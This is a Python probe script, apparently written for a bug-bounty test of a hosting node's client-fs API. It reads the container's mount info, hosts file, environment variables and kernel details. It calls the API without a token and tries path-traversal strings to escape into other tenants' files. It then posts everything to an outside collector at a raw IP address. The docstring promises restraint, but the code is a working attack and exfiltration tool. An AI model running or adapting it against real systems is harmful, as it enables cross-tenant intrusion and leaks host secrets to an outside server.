#!/usr/bin/env python3
"""probe19 - retest the client-fs API with the REAL allocation id, and test path containment.

probe18 used the node's UUID (from /etc/hosts) instead of the allocation's, so every call returned
"Unknown allocation" - but crucially it returned that RPC data error rather than "Permission denied",
with no token. This pass parses the true allocation id from /proc/self/mountinfo and then:

  1. reads our OWN allocation (ls / , stat + cat /etc/hostname) with no token;
  2. tests whether the path parameter is contained to the allocation directory (path traversal), which is
     the difference between "read your own files" (harmless - we are root in that container) and "read any
     file on the node, including other tenants' allocations" (critical).

Bound: if traversal succeeds, record the STATUS and the shape of the response only. No other tenant's file
contents are read or retained - that would be another customer's data, and the correct move is to report
the capability, not to exercise it.
"""
from __future__ import annotations

import json
import os
import re
import socket
import ssl
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt19"
NODE = "169.254.1.2"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "alloc": {}, "own": {}, "traversal": {}, "node_info": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sh(cmd, t=15):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=t)
        return (r.stdout + r.stderr).decode("utf-8", "replace").strip()[:600]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def api(path, timeout=8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((NODE, 4646))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=NODE)
        t.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n" % (path, NODE, UA)).encode())
        d = b""
        while len(d) < 4000:
            try:
                c = t.recv(2000)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        t.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:50])


def call(kind, alloc, path):
    r = api("/v1/client/fs/%s/%s?path=%s" % (kind, alloc, path))
    line = r.split("\r\n")[0]
    body = r.split("\r\n\r\n", 1)[-1]
    return "%s :: %s" % (line, body[:260].replace("\n", " "))


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

mi = sh("cat /proc/self/mountinfo")
ids = sorted(set(re.findall(r"/alloc/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", mi)))
RESULTS["alloc"] = {"ids_from_mountinfo": ids, "hosts": sh("cat /etc/hosts")[:300]}
alloc = ids[0] if ids else ""

if alloc:
    RESULTS["own"] = {
        "ls /": call("ls", alloc, "/"),
        "stat /etc/hostname": call("stat", alloc, "/etc/hostname"),
        "cat /etc/hostname": call("cat", alloc, "/etc/hostname"),
        "ls /alloc": call("ls", alloc, "/alloc"),
    }
    RESULTS["traversal"] = {
        "ls /.. ": call("ls", alloc, "/.."),
        "ls ..%2f..": call("ls", alloc, "..%2f.."),
        "ls /../../..": call("ls", alloc, "/../../.."),
        "stat /../../../../etc/hostname": call("stat", alloc, "/../../../../etc/hostname"),
        "cat node-root /etc/shadow (path escape attempt)": call("cat", alloc, "/../../../../../../etc/hostname"),
    }

RESULTS["node_info"] = {
    "env": sh("env | head -5"),
    "uname": sh("uname -a"),
}
RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:4500])
while True:
    time.sleep(60)
